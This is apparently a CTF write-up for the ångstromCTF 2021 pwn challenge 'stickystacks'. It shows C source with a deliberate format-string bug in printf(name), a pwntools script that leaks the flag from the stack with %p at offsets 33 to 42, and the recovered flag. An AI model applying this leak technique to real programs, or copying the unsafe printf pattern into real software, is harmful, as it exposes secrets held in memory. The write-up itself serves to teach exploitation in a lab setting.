---
layout: post
title: ångstromCTF 2021 - stickystacks
categories: [Write-Ups, AngstromCTF]
tags: [AngstromCTF, Pwn]
featured-image:  AngstromCTF/icon.png
featured-image-alt: AngstromCTF
---

It's a write-up about the challenge : [AngstromCTF - stickystacks](https://ctftime.org/task/15322)

	
## 1. Challenge


I made a program that holds a lot of secrets... maybe even a flag!

Source

Connect with nc shell.actf.co 21820, or visit /problems/2021/stickystacks on the shell server.

Author: JoshDaBosh
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


typedef struct Secrets {
    char secret1[50];
    char password[50];
    char birthday[50];
    char ssn[50];
    char flag[128];
} Secrets;


int vuln(){
    char name[7];
    
    Secrets boshsecrets = {
        .secret1 = "CTFs are fun!",
        .password= "password123",
        .birthday = "1/1/1970",
        .ssn = "123-456-7890",
    };
    
    
    FILE *f = fopen("flag.txt","r");
    if (!f) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }
    fgets(&(boshsecrets.flag), 128, f);
    
    
    puts("Name: ");
    
    fgets(name, 6, stdin);
    
    
    printf("Welcome, ");
    printf(name);
    printf("\n");
    
    return 0;
}


int main(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    vuln();
    
    return 0;
}


```

## 2. Solution

This was a simple "leak the flag from the stack" challenge, and for this one the "gadget" would be a format string vulnerability.
I struggled for a bit despite quickly getting the right idea since %x and %d were not working (I was getting parts of the flag but it felt like the values were all being cut off). I even tried %ld and %lld but since we had a 5 character limit this did not work as expected.

Thankfully after remembering about and switching to %p it was smooth sailing.

```
from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './stickystacks'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

flag = b""

# Let's fuzz x values
for i in range(33, 43):
    try:
        p = start()
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(':', '%{}$p'.format(i))
        p.recvuntil('Welcome, ')
        # Receive the response
        result = p.recvuntil('\n')
        flag_segment = unhex(result.strip().decode()[2:])
        print(str(i) + ": " + str(flag_segment))
        flag += flag_segment[::-1]  # Reverse and decode
    except EOFError:
        pass

success(flag)
```



The flag was : **actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}**